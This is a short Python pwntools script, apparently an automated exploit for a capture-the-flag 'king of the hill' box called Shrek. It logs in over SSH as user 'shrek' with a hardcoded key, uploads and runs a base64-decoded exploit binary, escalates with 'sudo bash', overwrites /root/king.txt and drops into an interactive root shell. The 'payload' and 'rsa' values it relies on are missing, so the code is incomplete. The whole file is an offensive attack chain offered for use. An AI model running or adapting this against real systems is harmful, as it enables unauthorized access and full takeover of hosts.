import signal,sys
try:
    from pwn import *
    print("\n[\033[1;32m+\033[1;37m] Autopwn Shrek ~ 0xASTUTE\n")
except:
    print('\n[\033[1;31m!\033[1;37m] this script requires sudo previlages\n\n[\033[1;31m!\033[1;37m] Try installing pwntools python library\n')
    exit(1)
def kill(sig, frame):
    print("\n[\033[1;31m-\033[1;37m] Saliendo\n")
    sys.exit(1)
target=sys.argv[1] 
signal.signal(signal.SIGINT, kill)

os.system('echo "%s" | base64 -d > exploit' % (payload))
os.system('echo "%s" > key' % (rsa))
request = ssh(host=target, user='shrek', keyfile='key')
shell = request.process("/bin/sh")
request.upload("exploit")
shell.sendline(b"chmod +x exploit; bash -c './exploit'")
time.sleep(0.5)
shell.sendline(b"sudo bash")
time.sleep(0.5)
shell.sendline(b"cd /root; echo '0xASTUTE' > king.txt")
time.sleep(0.5)
shell.sendline(b"cd")
time.sleep(0.5)
shell.interactive()